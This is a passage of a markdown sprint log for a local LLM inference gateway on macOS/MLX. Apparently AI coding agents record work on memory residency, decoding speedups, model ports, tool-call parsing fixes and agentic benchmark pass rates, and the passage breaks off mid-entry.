- [x] **govern-os-containment** — **RESOLVED: not feasible on macOS via RLIMIT (`nimble-raven`, 2026-06-22,
  empirically tested).** macOS **ignores `RLIMIT_AS`** (a 3 GB host alloc succeeded under a 2 GB `ulimit -v`),
  and Metal/unified memory isn't process address space anyway (a 6 GB GPU alloc sailed past a 4 GB limit).
  Jetsam priority (`memorystatus_control`) needs entitlements a normal process lacks. ⇒ there is no simple
  OS lever to convert a breach into a recoverable process-kill. **The practical containment IS the `shed`
  governor** (react to the OS jetsam pressure level + unload BEFORE the kernel panics) — already shipped.
  No separate OS-containment to build; don't pursue RLIMIT.
- [~] **residency-unify-in-process** (design: `docs/specs/residency-unify.md`) — fold co-residency into one
  in-process Switchboard; flock ledger stays the cross-process backstop. **U1 + U2 DONE (`nimble-raven`,
  `ee30c92`+`fb58d7f`):** U1 = warm admission is now footprint-accurate (`runtime_footprint_bytes`, not raw
  weights) + host-aware (`host_ram_budget_bytes − committed_by_others`) → closed a latent overcommit path
  (multislot is on by default). U2 = under OS pressure the watchdog sheds idle WARM secondaries first (keeps
  the primary serving), primary-unload last resort. ✅ **Reservation-update API DONE (`05352c5`):**
  `ResidencyGuard::update_footprint` + free-fn `share::update_my_reservation(model, footprint)` (grow-safe
  in-place rewrite, no-op without a reservation), 14/14 share tests. ✅ **WIRING DONE (`21ed3a9`):**
  `ensure_warm` (after a warm load) + `sweep_idle_warm` (after evict, lock released first) republish
  `primary + Σ warm` — deadlock-safe (the free fn locks the ledger file, not the warm map). 74/74 gateway
  tests. **So residency-unify U1 (host-aware + footprint-accurate + republished) + U2 are COMPLETE.**
  ✅ **U3 substantially DONE** (`9853277`+`db930ce`): routing already works (a request for a different
  cached model warm-loads + serves it); added **declarative preload** (`ROZUM_WARM_MODELS=spec1,spec2`
  warms a named set at startup, admission-gated) + **`/stats resident_models`** (the co-resident set is
  visible). **REMAINING:** (c) the architecture call — make the in-process Switchboard the *primary*
  multi-model path over the N-process flock (affects the matrix harness → team decision, not solo); an
  optional fuller routing *policy* (pin/priority) only if a need appears. (`footprint-before-download`:
  DONE `a261fb0`.)
- [x] **footprint-before-download** (`nimble-raven`) — **DONE `a261fb0`.** The footgun: estimate ran BEFORE the
  download, so an uncached model reserved the unknown-size sentinel (~4.4e12 MB) for its whole life →
  blocked every other load. Fix (now trivial via the reservation-update API): after the model loads (hence
  resolved/cached) in `run_gateway` + `run_launch_dedicated`, re-estimate the real footprint and
  `share::update_my_reservation()`. So an uncached model over-blocks others only during its one-time load
  window, not forever; cached = no-op. cargo check default + --no-default green.
- [x] **residency-ledger-hardening** (`sunny-civet`) — **DONE `f5cbec2`.** Ledger was already flock-robust;
  added `reap_orphan_residents()` (reusable reaper for a doctor/maintenance path) + edge tests (PID-reuse
  overwrite, dead-vs-live reap, non-pid/held files untouched). Additive to `share.rs`, no API change → did
  not disturb smmr-A/B. Core 93/93. Deferred (riskier, touches `gateway.rs`): release-on-idle-unload.

> #### ▶ sunny-civet active tracks (2026-06-22, operator: "запиши всё в спринт и сделай автономно")
> Discipline: slot-free + non-colliding by default (room MCP down → coordinate via `rozum meetings post`;
> nimble-raven owns rozum-mlx cap / rozum-models footprint / the model slot — I add NEW files, don't edit
> their code, don't grab the slot). Order:
> 1. ✅ **smmr-D-probe-harness** DONE (`4c2329b`) — set_memory_limit empirically SOFT; harness for D.
> 2. ✅ **residency-ledger-hardening** DONE (`f5cbec2`).
> 3. [~] **smmr-C-fast-swap** foundation DONE (`c3fa8ef`); orchestration slot-gated (after D).
> 4. ✅ **decode-compile-stage0** DONE (`f6b20a3`) — NO-GO: plain compile 0.58–0.69× (slower) on 0.6B;
>    don't build Stage 1/2. ✅ **x86 spec** freshened (`e9ff8cf`, A-prereq = `drive` landed).
> Outcome: my source-audit finding (`9726971`) was accepted — nimble-raven reconciled A/B (`e7c9762`,
> "admission is the lever") and used my probe's model-mode to settle co-residency is safe (`e8d8081`).

> #### ▶ sunny-civet idea backlog (operator-authorized 2026-06-22: "запиши все эти задачи и делай автономно")
> Seven ideas from a step-back review. Discipline unchanged (slot-free + non-colliding; coordinate via
> `rozum meetings post`; new files / my lane; never grab the slot blind). Order = value × (slot-free,
> completable). Claiming all under `sunny-civet`; the deep ones (#4–#7) get design-specs first, not a rushed impl.
> - [x] **mem-pressure-watchdog** (#1, SAFETY) — **DONE.** `rozum-core::shed`: reads OS pressure
>   (`kern.memorystatus_vm_pressure_level`) + pure `should_shed(pressure, inflight, idle)` (7 tests). Gateway
>   lifecycle watchdog now unloads its OWN idle model under genuine host pressure → graceful degradation, not
>   reboot. Conservative: never interrupts in-flight, idle-only (min-idle 30s), Critical-only by default
>   (`ROZUM_GATEWAY_SHED_ON_WARN=1` earlier; `ROZUM_GATEWAY_SHED=0` off); sysctl probe only when idle (no
>   hot-path cost). Minimal gateway.rs hook (extends the idle-unload watchdog). gateway 74/74, core 107/107.
> - [x] **gguf-mistralrs-residency-cap** (#2, SAFETY) — **INVESTIGATED → largely a NON-GAP** (`sunny-civet`,
>   verify-before-build). Spec § "Findings: gguf/mistralrs are not an unenforced reboot vector". (1) Admission
>   (`acquire_residency`) is engine-agnostic — runs BEFORE engine selection, so the load-time overcommit is
>   already gated for all engines. (2) gguf/candle has NO MLX-style retained-cache balloon (allocates/frees
>   per op) → footprint ≈ weights+KV, captured by the estimate; no analog cap needed. (3) mistralrs is
>   *better* bounded than MLX — PagedAttention pools KV to ContextSize(n_ctx), the device-mapper refuses an
>   over-budget load before weights, max_num_seqs=1, + a RAM preflight. Residual is only that non-MLX can't
>   pack as tightly (lever = lower n_ctx, not a cache cap); optional follow-up = calibrate runtime_footprint
>   vs a measured gguf/mistralrs peak. No safety code change needed. Corrects smmr-A's "Known limitation".
> - [x] **agentic-smoke-deterministic** (#3, RELIABILITY) — **DONE + VALIDATED 4/4** (`scripts/smoke/gateway-smoke.sh`).
>   Ran end-to-end on Qwen3-0.6B once the slot freed: PASS liveness/schema, PASS greedy byte-identical across
>   runs, PASS stable after an interleaved different request. Asserts only DETERMINISTIC signals (a red is
>   always a real gateway regression, never model variance); dropped the tool-call check (0.6B below the cliff →
>   would flake; unit-tested instead). Slot-coordinated (host clear, freed after). Gotcha found + fixed: a
>   partially-downloaded model (killed before the tokenizer) fails with a misleading no-backend hint — improved
>   the smoke to surface the REAL cause (`gw_cause`). NOTE for CI: the model must be FULLY cached (`--offline`).
> - [~] **prompt-lookup-decoding** (#4, PERF) — **SPEC + P0 DONE, GATE PASSED.** `PromptLookupDraft`
>   (`specdecode_plookup.rs`, drop-in `impl Draft` — reuses the whole `specdecode` verify loop; ~zero draft
>   cost FLIPS the MoE spec-decode net-negative) + 6 unit tests. **P0 accept-rate MEASURED** (real Qwen3-0.6B
>   tokenizer, real 2215-tok code edit, `prompt_lookup_acceptrate_on_real_edit`, slot-free/forward-free):
>   **2.1×–5.0×** (default n=2,k=5 → **3.4×**, accept 71%). Synthesis: decode is FFI-bound (why compile was
>   NO-GO) ⇒ verify forward L=k+1 ≈ L=1 cost ⇒ tokens/forward ≈ real wall-clock speedup. Caveat: byte-exact on
>   DENSE only ([[project-spec-decode-moe-numerics]]). **P1 LIVE DONE — byte-exact + 7.06×:**
>   `run_prompt_lookup_dense` plugs PromptLookupDraft into the EXISTING byte-exact `MlxDenseTarget` verify
>   (zero new verify code — output `== greedy_decode_dense` by construction); live test on Qwen3-0.6B copy
>   prompt = 120 tok BYTE-IDENTICAL, 17 forwards vs 120 → **7.06×**. **P1.5 DONE + LIVE A/B PASSED:**
>   `run_plookup_job` + gated branch in `worker_main` — greedy+dense+unconstrained job → prompt-lookup IFF
>   `ROZUM_PLOOKUP=1` (default off = zero impact). Additive, compiles. **Live A/B PASSED**: ROZUM_PLOOKUP=1
>   engaged (14 forwards/60 tok ≈ 4.3×), served output BYTE-IDENTICAL to off, off-case = normal path.
>   So prompt-lookup SERVES real requests end-to-end, gated, byte-exact. REMAINING: **P2** MoE near-tie
>   policy, **P3** matrix gate (slot + coordinate). Spec `docs/specs/prompt-lookup-decoding.md`.
> - [~] **cross-turn-prefix-kv-reuse** (#5, PERF) — **CORRECTION (`sunny-civet`, verified in code): the
>   single-agent win is ALREADY SHIPPED — don't rebuild it.** `mlx_native_backend.rs:~1111-1130` persists the
>   previous request's KV cache and, on the next turn, truncates to the shared prefix and prefills only the
>   new suffix — for dense + hybrid (Qwen3.6) + gpt-oss (the comment: "without reuse every turn re-prefills
>   the whole growing conversation — brutally slow for multi-turn agents"). My idea #5's premise ("inter-request
>   reuse doesn't exist") was WRONG. Residual gaps (smaller, real, if a need appears): (a) the store keeps ~one
>   recent prefix → concurrent/interleaved agents thrash it (multi-prefix LRU cache); (b) gguf/mistralrs lack
>   it (cross-engine). Re-scope to those before any work; no big single-stream win remains here.
> - [~] **fast-swap-feature** (#6, NORTH-STAR) — **PREWARM WIRED (`sunny-civet`).** `Switchboard::switch`
>   now spawns `prefetch::warm_dir_page_cache(new_dir)` fire-and-forget BEFORE `begin_drain`, so the new
>   model's weights warm into page cache DURING the drain → rebuild reads from RAM. Safe ordering was already
>   correct (drop old before rebuild — never two resident); prewarm only overlaps, page cache is off-budget.
>   `ROZUM_SWAP_PREWARM=0` disables. Additive, 4/4 switch tests pass. REMAINING (slot): measure swap latency
>   with/without prewarm on two real models; `oversubscribed`-triggered auto-swap is a separate follow-up.
> - [~] **cpu-uma-offload** (#7, NORTH-STAR) — **SPEC DONE** `docs/specs/cpu-uma-offload.md`. KEY CORRECTION:
>   on Apple UMA there is NO separate VRAM — "spill to CPU RAM" doesn't free GPU memory (same bytes). The real
>   lever is RESIDENCY not location: keep weights pageable (page-cache, NOT Metal-wired via `set_wired_limit`)
>   and stream each layer's weights into a small Metal residency just-in-time → run models bigger than the
>   Metal cap (feasibility, not speed — decode goes bandwidth-bound, ~2.5 tok/s for a 70B). Ties to BUG-003
>   (wired memory is the non-evictable part that feeds the jetsam panic). **P0 first-pass DONE** (sunny-civet,
>   source+vmmap): MLX is NOT hard-wired (`wired_limit_`=0) but COPIES weights to ANONYMOUS Metal buffers
>   (vmmap 0.6B: 438 MB dirty ≈ weights), not mmap-clean → recoverable headroom EXISTS but needs MLX to
>   mmap-in-place + per-layer stream (deep change). Verdict: real North-Star effort, NOT a quick win; benefit
>   on UMA = "droppable not compressible" (eases pressure + bigger models), not "free GPU memory";
>   bigger-models-NOW = GGUF/x86. REMAINING: vmmap dirty/clean split on a 27B for the precise number (slot);
>   P1 per-layer streaming, P2 admission integration, P3 KV. Slot + MLX-forward = engine owner.

- **INTERIM SAFETY:** the interim floor is dropped; smmr-A caps each process. CAVEAT (`sunny-civet`,
  `9726971`): the cap is via `set_memory_limit` which is SOFT — see spec § Findings; co-residency safety
  is not yet *proven* (hinges on smmr-D's active-vs-cache measurement), so treat default co-residency as
  provisional until D lands.

#### 1. Green matrix — NO fails allowed, ever

The matrix must be **all green**. Every fail — and every non-deterministic flip — is a
concrete bug **in our stack**, to isolate **fully and from all sides (the `isolate` skill)
BEFORE any conclusion**. Never close a cell as "model too weak / model-side" — that has been
premature and wrong before (codex×gpt-oss was *our* gateway bug twice). One task per fail.

##### Matrix model coverage (operator 2026-06-27) — stronger/newer local coders for the e2e tasks

- [x] **matrix-add-coders** — DONE (2026-07-03). Add two stronger agentic
  coders to the matrix; **both already load natively** (no porting): **Qwen3-Coder-30B-A3B-Instruct**
  (`qwen3_moe`, 4bit 17.2 GB / DWQ for ~8-bit quality) — purpose-built agentic coder, the cheapest
  upgrade over the unreliable gpt-oss-20b executor ([[project-gptoss-agentic-codegen-unreliable]]);
  and **Devstral-Small-2507** (`mistral`→llama loader, 4bit 13.3 GB) — Mistral SWE/edit specialist,
  small → big context. **CAVEAT to verify, do NOT assume:** the matrix history *dropped* old
  Mistral-v0.3 as unable to drive tools (agentic.sh header) — Devstral is agentic-tool-tuned so may
  differ, but treat its tool-use as a hypothesis to confirm over N runs, not a given. Done = added to
  `agentic.sh` default set + a model-only/agentic smoke on `rpn build fix test debug` vs the
  Qwen3.6-35B/gpt-oss baseline (🛑 REBOOT-SAFETY: one model-gateway at a time, claim the slot first).
  Code edit (catalog) shipped. **Smoke #1 RAN (2026-06-27, claude×Qwen3-Coder, REPS=2, results
  `scripts/bench/results/agentic-20260627-115815`): 7/10 — fix 2/2, test 2/2, debug 2/2 (edit = 6/6
  perfect), build 1/2, rpn 0/2 (one a 900s RUN_TIMEOUT).** ⚠️ INCONCLUSIVE on create-from-scratch:
  a sibling experiment (`pipeline-swap-settle` matrix/router runs on :8300/:8500) was resident
  THROUGHOUT → gateway contention (RAM hit 95 MB; the rpn 900s timeout smells like saturation, not
  model-can't). Per [[project-matrix-nondeterminism]] a contended red ≠ verdict.
  **CLEAN-BOX RESULTS (2026-07-03):** rpn 3/3 ✓, build 3/3 ✓ (constrain fix `33a146a` helps),
  test 2/2 ✓, debug 2/2 ✓. fix 0/2 ✗ — ROOT CAUSE: model nondeterministically uses JSON format
  for Edit; when old_string spans multiple lines (e.g. the full Rust file), model encodes newlines
  as SPACES (`"fn reverse...  fn main..."`) instead of `\n` → old_string never matches → 284-tool
  loop. Was 2/2 in smoke #1 likely because contention pushed the model toward XML format (which
  handles newlines correctly). VERDICT: Qwen3-Coder-30B-A3B is STRONG on create-from-scratch
  (rpn+build 6/6) and fine on focused-edit (test+debug 4/4 where only a 1-line change is needed),
  but loops on multi-line Edit (fix 0/2). Add to matrix for create-from-scratch scenarios; known
  fix-task weakness ([[project-agentic-loop-root-cause]]). Not proposed fix yet — option: fuzzy
  old_string matching in gateway (normalize whitespace → newline) or force XML-only for Edit.
  (Found+fixed BUG-005 here: offline+uncached →
  bogus 4 PB overcommit; the queue now pre-downloads via uv+huggingface_hub.)

###### ★ green-matrix-min-footprint (operator 2026-06-27) — full e2e matrix green AT lower peak RAM

GOAL: every e2e cell (`rpn build fix test debug` × agents) PASS, **while minimizing peak host RAM**.
Two levers, both tracked here:
- **Complementary pipelines (low peak):** a `--model A,B` pipeline runs LAZY — one tier resident at a
  time, prev torn down before next (MLX can't co-reside) → peak = MAX(tier), not sum
  ([[project-pipeline-cascade]]). A small strong-planner + small reliable-executor can green the
  matrix at a fraction of one big model's peak. Pick each pair complementary (planner =
  correct-code/reasoning; executor = reliable tool-delivery — the GLM-32B→gpt-oss precedent).
- **Small low-active-param MoE ports:** tiny active params peak low (DeepSeek-Coder-V2-Lite
  16B-**A2.4B**, GLM-4.7-Flash 64e/4-active). Porting them widens the low-footprint toolbox.

VERIFY EACH PROMISING MODEL IN THE MODE THAT FITS (record peak RAM + pass-rate per config; 🛑 one
model-gateway at a time, slot-claim first; REPS≥2; contended runs don't count — [[project-matrix-nondeterminism]]):

- [x] **mla-deepseek-v2** (PORT, DONE + landed origin/master, fork rev `1e8ed172`) — **MLA** latent
  attention + DeepSeek MoE in `deepseek_v2.rs` (naive form: q_a/q_b + kv_a/kv_b low-rank, decoupled
  nope/rope dims, YaRN mscale rope, MQA k_pe broadcast). Unlocks **DeepSeek-Coder-V2-Lite** (16B-A2.4B
  → very low peak), the shared MLA base for GLM-4.7-Flash. **Byte-IDENTICAL** greedy vs Python mlx_lm
  (4 bugs caught+fixed: q_lora_rank Option, bf16 router gate, YaRN scale-boost, faithful YaRN rope).
- [x] **mlx-glm4-moe-lite** (PORT, DONE + VALIDATED, fork rev `60c78ca1`, wired
  `feature/rozum-glm4-moe-lite-wire`) — **GLM-4.7-Flash** (`glm4_moe_lite`, 16.9 GB, fits) via the
  **ABSORBED** MLA (`embed_q`/`unembed_out` = per-head `QuantizedMultiLinear`, compressed
  kv_latent+k_pe cache, pe_scores additive SDPA mask, L==1 decode vs L>1 prefill branches) +
  DeepSeek-V3 `noaux_tc` routing (sigmoid + e_score_correction_bias + norm_topk_prob ×
  routed_scaling_factor + shared expert + first_k_dense=1). **1 forward bug** caught+fixed: pe_scores
  f32 mask must cast to bf16 query dtype for SDPA. **Parity: greedy byte-matches Python ~27 tokens on
  identical prompt ids**, then near-tie flip = irreducible quantized-MoE non-determinism
  ([[project-spec-decode-moe-numerics]]), forward numerically faithful (coherent correct code+haiku).
  Spec `docs/specs/glm4-moe-lite-native.md`. **TOOL-CALLING FIXED + SHIPPED (master e016921):** GLM-4.5/
  4.6/4.7 emit `<tool_call>`/`<arg_key>`/`<arg_value>` as SPECIAL tokens → (1) the skip-special decode
  stripped them (delivery: `EngineMeta.keep_special` + `serving::parse_glm_arg_kv`), (2) `dialect_for`
  mis-rendered prior calls as GLM-4 `name\n{json}` → multi-turn loops (`GlmArgKvDialect` renders the
  native `<tool_call><arg_key>` form). **Agentic smoke claude×REPS=2: 0/10 → 3/10** (build, test×2; RAM
  healthy ~400 MB not 16 GB). Remaining fails (fix 67t, rpn/debug timeout) = the orthogonal agentic-loop
  ([[project-agentic-loop-root-cause]]), not a GLM gateway bug.
  **2026-06-29 follow-up (GLM-4.7-Flash green-plane attempt):** launch repair now emits diagnostic
  `cargo run` mismatch errors, includes bounded `Cargo.toml`/`src` snapshots, adds an unsupported-edition
  Cargo manifest hint, and reminds Claude Code that prompt snapshots do not satisfy the Read-before-Edit
  guard. `scripts/bench/agentic.sh` no longer tells models that failed `Edit` means "already applied",
  and its `rpn` prompt now exposes both verifier examples. Focused `claude × GLM-4.7-Flash` smoke at
  `NCTX=8192`: **build/fix/test/debug/rpn = 5/5** across targeted runs
  (`glm47-flash-build2-20260629-170340`, `glm47-flash-repair-20260629-163454`,
  `glm47-flash-buildtest-20260629-165806`, `glm47-flash-rpn2-20260629-165228`; peak ~24.5-25.0 GB).
  **2026-07-03 FULL MATRIX (agentic-20260703-120113, claude × REPS=3, n_ctx=14336 adaptive, peak
  24.1 GB): **15/15** — rpn 3/3, build 3/3, fix 3/3, test 3/3, debug 3/3. Added to DEFAULT_MODELS.**
- [x] **native-mlx-gate-mla-families** — DONE (2026-06-29): keep the model download gate in sync with
  the native loader. `LoadedModel` already supported `deepseek_v2` and `glm4_moe_lite`, but
  `supported_model_type` still rejected those `config.json` model types for uncached specs, so a fresh
  DeepSeek-Coder-V2-Lite / GLM-4.7-Flash matrix run could fail before downloading/loading weights.
  Added both types to the gate and a no-MLX unit test to lock them down.
- [x] **verify-standalone** — DONE (clean box, 2026-06-27, results scripts/bench/results/agentic-*).
  **VERDICTS:** (1) **Qwen3-Coder-30B-A3B** — strong EDIT (fix/test/debug 6/6, smoke #1); but
  create-from-scratch **0/6 clean** (rpn 0/3 + build 0/3). ⚠️ CAUSE **NOT isolated** — do NOT call it
  a capability limit (repo rule: that's been premature+wrong before). Symptoms are delivery-shaped:
  an rpn run spun **523 turns/500 tools** (loop = undelivered/again tool call, [[project-agentic-loop-root-cause]]);
  build fails "no src/*.rs" with 9 tools (likely subdir-path vs verify, or content edge-case). NOTE:
  `serving.rs` DOES parse Qwen3-Coder's `<function=…><parameter=…>` XML form, so it's NOT a trivial
  format gap → suspect parser edge-case on real multi-line `content`, OR subdir path, OR loop-stop.
  **NEXT (isolate skill): a live create-from-scratch probe with payload capture** (enable gateway
  request/response logging or mock) → read the actual emitted tool call + where the file landed,
  BEFORE any capability verdict. Also confirmed: it does not (yet) beat Qwen3.6-35B (15/15) on create.
  (2) **Devstral-Small-2507** —
  **pre-injection smoke: 0/10, tools=0 on every cell** → the run proved the model saw no executable
  tool defs, not that Devstral is incapable. The template-less tool injection fix below landed after
  that smoke, including the Devstral prose-"tools" detector regression; **NOT DROPPED anymore**.
  **Post-injection bench (2026-07-03, REPS=2, 10 tasks): 0/10 — tools=0–1 still.** Root cause
  isolated: injection PREPENDED a second system message → Devstral template created two `[SYSTEM_PROMPT]`
  blocks → second block (Claude Code's) dominated → `<tool_call>` format forgotten → model emitted raw
  `Write{json}` (not parsed). **FIXED 2026-07-03 (master `52bf4f7`)**: injection now MERGES into the
  existing system message when one is present. Live-verified: `stop_reason` tool_use restored.
  **THIRD BUG found+fixed (2026-07-03, `3a6baa2`):** `eos_token: None` in template args caused
  `string + none` crash on the SECOND prompt (after first tool_use round-trip) → 500 error → only
  1 tool_use total across 5 turns. Fix: read `eos_token` from tokenizer_config.json and pass it.
  **FOURTH BUG found+fixed (2026-07-03, `b3c8ab6`):** `anthropic_messages_to_internal()` converts
  `tool_result` blocks to `Role::Tool`; `QwenDialect` renders them as role="tool"; Devstral template
  raises "Only user, system and assistant roles are supported!" → 500 on EVERY second turn →
  `api_retry` 10× → task never completes. Fix: `template_supports_tool_role()` detects templates
  lacking "tool" branch; `render_prompt_opt` remaps `Role::Tool → Role::User` before rendering.
  **VERDICT (2026-07-03, all 4 bugs fixed, results `agentic-20260703-094702`):**
  **5/5 PASS** (rpn 185s/turns=9/tools=4, build 143s/turns=7/tools=3, fix 141s/turns=7/tools=3,
  test 121s/turns=7/tools=3, debug 141s/turns=7/tools=3). REPS=1 with claude agent, 13.3 GB peak.
  Devstral-Small-2507 IS a viable low-footprint agentic matrix member. Four gateway bugs blocked it;
  all fixed (52bf4f7, 3a6baa2, b3c8ab6) — benefits all Mistral/DeepSeek template-class models.
  (b) Qwen3-Coder rpn probe DONE (2026-07-03): ROOT CAUSE = premature JSON string close — model
  nondeterministically chooses JSON format for Write(src/main.rs) then emits `expect("msg")` which
  closes the content field prematurely → constrained decoder generates whitespace → is_runaway_loop
  fires at 134 tokens → malformed JSON → Write silently dropped → model falls back to Bash printf.
  FIX: constrain guard removes `"` from allowed when second-best non-quote token is invalid after close
  (`33a146a`). Guard fires ~50 % of the time; Bash fallback recovers the rest. Validated rpn 3/3 PASS
  clean box. Also added ROZUM_RAW_DUMP to BatchSeq::finalize() for future diagnostics.
  DeepSeek-Coder-V2-Lite bench DONE (2026-07-03, `agentic-20260703-110852`): **2/5 PASS** (build, test;
  rpn/fix/debug FAIL), 17 GB peak. WORSE than Devstral (5/5, 13.3 GB) on both RAM AND quality.
  rpn(0/1 rc=1, 6t/2tools) — tool delivery or capability; fix `false_success_after_error`; debug
  `edit_old_string_miss`; build passes but at 30 turns/23 tools (Devstral: 7 turns/3 tools). **DROPPED.**
  QUEUED (slot-watcher, 2026-06-27): pre-downloads Devstral, waits for a
  clean box, then re-runs Qwen3-Coder `rpn build` (REPS=3, the contended ones) + Devstral full set
  (REPS=2). clean-box smoke (no sibling) of each native-now model, peak + pass-rate:
  Qwen3-Coder-30B-A3B (re-run `rpn build` — smoke #1 was contended), Devstral-Small-2507
  (verify-first: Mistral tool-use), Qwen3-32B (dense), Qwen3.6-27B, Phi-4, Gemma-3-27B. Drop any that
  don't beat the incumbent at equal/lower peak.
- [x] **mla-deepseek-v2 → matrix smoke** — DeepSeek-Coder-V2-Lite (validated MLA port) agentic smoke
  (2026-06-27): **pre-injection 0/10, tools=0 on EVERY cell** (turns=3-4, tools=0; 15 GB footprint).
  The PORT is byte-validated (it RUNS), and the red was fed into `toolcall-delivery-isolate` below.
  Re-test after template-less tool injection before making a green-matrix verdict.
- [x] **toolcall-delivery-isolate** — **ROOT CAUSE FOUND (2026-06-27, live capture):** DeepSeek-Coder-
  V2-Lite's chat_template (tokenizer_config.json, 459 chars) has **NO tools/tool_calls/function slot**
  — it only renders `User:/Assistant:`. So the gateway's template-based tool rendering **silently
  drops the tool defs** (proof: a request WITH a Write tool produced PROMPT_IDS len=23 = just the user
  msg, no tools; the model replied in prose, stop_reason=end_turn, no tool_use). The model never SEES
  the tools → tools=0. **This is a GATEWAY gap (template-less tool rendering), NOT a model verdict** —
  the discipline held (don't blame the model). Affects DeepSeek + likely Mistral/Devstral (same
  template class). **FIX LANDED:** when a model's chat_template lacks tool support, the MLX prompt
  renderer now injects a synthetic system tools section with the `<tool_call>` format the parser
  already handles; `ROZUM_INJECT_TOOLS=0` remains the opt-out. Regression coverage now locks both the
  detector (Devstral prose "tools" is not enough) and the injected prompt contract. Caveat: a
  non-tool-trained model may still not comply; injection is the necessary first step. One fix unlocks
  several low-footprint matrix candidates. **Second gap found (2026-07-03) and FIXED (`52bf4f7`):**
  injection into an EXISTING system message was broken — prepend created two `[SYSTEM_PROMPT]` blocks
  on Mistral templates; now merges. NEXT: quiet-slot live reruns for Devstral and DeepSeek-Coder-V2-Lite. (Original:) THREE low-footprint
  non-Qwen/GLM/gpt-oss models score **tools=0 on every agentic cell** (Devstral 0/10, DeepSeek-Coder-
  V2-Lite 0/10). The deepseek_v2 PORT is VALIDATED, so the model RUNS — it just emits no executable
  tool calls. Per the repo rule (never close as "model can't"), CAUSE NOT ISOLATED: suspect the
  gateway doesn't render/parse the tool format of these models' chat templates (it's tuned for Qwen
  `<tool_call>` / GLM `name\njson` / gpt-oss harmony; DeepSeek + Mistral use their own). If it's a
  gateway gap, ONE fix unlocks several low-footprint matrix candidates → highest-leverage item for
  green-matrix-min-footprint. NEXT: live capture (start the model gateway, send an Anthropic tools
  request, read the RAW emitted text) → what tool form it emits + whether `serving::parse_tool_calls`
  handles it. Same isolate as Qwen3-Coder create-delivery.
- [x] **verify-pipelines** — **CLOSED 2026-07-03: goal achieved by standalone models.** The
  green-matrix-min-footprint goal is fully satisfied without new pipeline combos:
  - **Devstral-Small-2507 13.3 GB, 5/5** (2026-07-03) — lowest footprint, all tasks pass with claude
  - **GLM-4.7-Flash 24.1 GB, 15/15** (2026-07-03) — next tier, full quality at 15% below 35B peak
  - **35B-DWQ ~28 GB, 15/15** — gold standard (still in DEFAULT_MODELS for critical tasks)
  - **GLM-32B→gpt-oss pipeline** already in DEFAULT_MODELS (proven 3/3 RPN complementarity)
  Pipeline pairs tested:
  (a) GLM-4-32B→Qwen3-Coder (2026-06-27): 0/2+0/2 — executor delivery unisolated, dropped
  (b) Additional post-port pairs (DeepSeek-V2-Lite, GLM-4.7-Flash as planner): MOOT — 
      DeepSeek dropped (2/5 at 17 GB, worse than Devstral); GLM-4.7-Flash as planner+gpt-oss 
      executor = peak 24.1 GB (max), no quality gain vs standalone GLM-4.7-Flash alone.
  No new pipeline combinations beat the existing standalone options.

- [x] **matrix-baseline** — DONE (plucky-finch 2026-06-22, seed-pinned, release@master,
  reboot-safe single-box, **0 panic/0 reboot/0 rc2**). claude+codex × {Qwen3.6-35B-A3B,
  gpt-oss-20b} × 5 tasks = **16/20 in this single run** (claude 10/10, codex 6/10). NOTE: a
  single run is one sample per cell, NOT a verdict — agent-layer non-determinism (codex injects a
  per-run session-id) means cells are pass-RATES (see `matrix-nondeterminism-flip`). Indeed one
  red, `matrix-35b-codex-test`, was an ~80%-pass FLAKE (4/4 on re-isolation) — already resolved.
  Remaining reds filed as `matrix-*` tasks below; confirm each over N runs before treating as a bug.
  Results: `scripts/bench/results/baseline-postfix/per-run.csv`.
  (Not yet run: opencode column; the other models — file more tasks when run.)
  - **PREP DONE (nimble-raven 2026-06-22):** runner is `scripts/bench/agentic.sh`; override via
    `AGENTIC_MODELS="spec1 spec2" AGENTS="claude codex" TASKS="greet build fix test debug"`
    (defaults: `Qwen3.6-35B-A3B-4bit` + `gpt-oss-20b-MXFP4-Q4`; gold standard Qwen3.6-35B = 15/15).
    It starts **one shared gateway per model, serially** (`gateway --port PORT_BASE+idx`), runs all
    agents×tasks, then SIGINT-drains + waits ≤`TEARDOWN_GRACE`(180s) for full process exit +
    `GPU_SETTLE`(8s) before the next model.
  - **REBOOT-SAFE — verified against the BUG-003 gate:** a *single* matrix never has >1 model
    resident (serial loop), and the old gateway's process fully exits (flock released on fd-close)
    before the next starts, so the gate's 240s wait is never approached → **no false-refuse within a
    run**. A *concurrent 2nd* matrix degrades gracefully: its gateway waits 240s then `exit(1)` →
    agentic.sh's "gateway not ready" path skips that model — it can't reboot the box. `agentic.sh`
    also `gateway stop --force`s any stale shared gateway first (frees a leftover flock).
  - **NOW SEED-PINNED (plucky-finch 2026-06-22):** `agentic.sh` exports
    `ROZUM_SAMPLING_SEED=${ROZUM_SAMPLING_SEED-1234}` → the baseline is reproducible by default
    (see `matrix-nondeterminism-flip`), so a red is reproducible+debuggable, not sampling noise.
  - **Before running:** follow the 🛑 REBOOT-SAFETY PROTOCOL (claim the slot in-room; `ps`/lockfile
    check that no OTHER model gateway — e.g. a dedicated one from another worktree — is live).
- [x] **matrix-nondeterminism-flip** — DONE (E1 fixed) + HONEST two-layer finding. Root cause
  has TWO layers: **E1 (our bug — FIXED):** the gateway never threads `SamplingParams.seed`, so
  the sampler + MLX RNG seed from entropy — any `temperature>0` request (Claude = 1.0) yields a
  different token stream per run. Proven on GLM-4-9B: temp1 unseeded **5/5 distinct** → temp1 +
  `ROZUM_SAMPLING_SEED=42` **1/5 (fixed)**. Shipped (default-OFF): `apply_determinism_env`
  (`ROZUM_SAMPLING_SEED`+`ROZUM_FORCE_GREEDY`, 3 tests) + `agentic.sh` seed-pin + probe.
  **CORRECTION (was "validated end-to-end" — that was premature):** the seed does NOT make the
  matrix fully deterministic, because of **Layer-A (agent's own, irreducible by us):** the agent
  CLIs inject a fresh per-run `session-id`+timestamp into every request (proven from codex's log),
  so the request is non-identical across runs → trajectory varies even at a fixed seed. Demonstrated:
  `codex×35B×test` flipped FAIL(baseline)→PASS(repro) at the SAME seed=1234 (see
  `matrix-35b-codex-test`). **Conclusion: the seed removes OUR sampling noise (E1); agent-layer
  noise remains, so the agentic matrix must be read as an N-run PASS-RATE, not a single binary
  cell** (echoes the GLM "5-task matrix too noisy" meta-finding). Spec
  `docs/specs/matrix-nondeterminism.md` (to update). Optional: OpenAI `seed` request-field parse.
- [x] **matrix-glm32-agentic** — CLOSED 2026-06-23: isolated from ALL sides → it IS a GLM-4-0414
  **model decision property**, not lost in our stack. Evidence chain: (1) clean-prompt model-only
  probe → GLM NAMES tools 3/3 (so render/schema/template are NOT dropping it); (2) my synthetic
  "narration-framing" sanitizer passed a strawman A/B but gave **NO lift** on the real
